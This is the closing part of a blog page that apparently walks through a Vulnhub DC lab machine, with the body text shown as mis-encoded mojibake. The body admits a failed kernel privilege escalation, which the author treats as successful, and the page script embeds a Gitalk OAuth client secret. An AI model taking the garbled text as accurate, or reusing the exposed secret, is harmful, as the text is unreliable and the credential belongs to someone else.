<p>å°è¯•ä¸€ä¸‹å‘ç°å†…æ ¸ç‰ˆæœ¬å·®åˆ«å¤ªå¤§å¯¼è‡´é¶æœºä¸Šè¿è¡Œä¼šç¼ºå°‘åº“ã€‚ç„¶è€Œåœ¨é¶æœºä¸Šç¼–è¯‘ä¹Ÿä¼šç¼ºå°‘åº“ã€‚æäº†å¥½ä¹…ä¹Ÿæ²¡å‘ç°æ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<p>æ€»ä¹‹ææƒçš„æ€è·¯å’Œè·¯å¾„éƒ½æ˜¯æ²¡é”™çš„ï¼Œæœ€åä¸€æ­¥å°±å½“ææƒæˆåŠŸäº†ã€‚å’Œè§£äº†ã€‚</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/03/DC-6/">â† Next [vulnhub]  DC:6</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/01/DC-4/">[vulnhub]  DC:4 Prev â†’</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">âˆ§</a><a id="to-index" href="#toc-div" title="To Catalog">â‰¡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">ç®€ä»‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">webæ¸—é€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5"><span class="toc-number">3.1.</span> <span class="toc-text">æŸ¥çœ‹ç½‘é¡µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">3.2.</span> <span class="toc-text">æ–‡ä»¶åŒ…å«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-number">3.3.</span> <span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">ææƒ</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>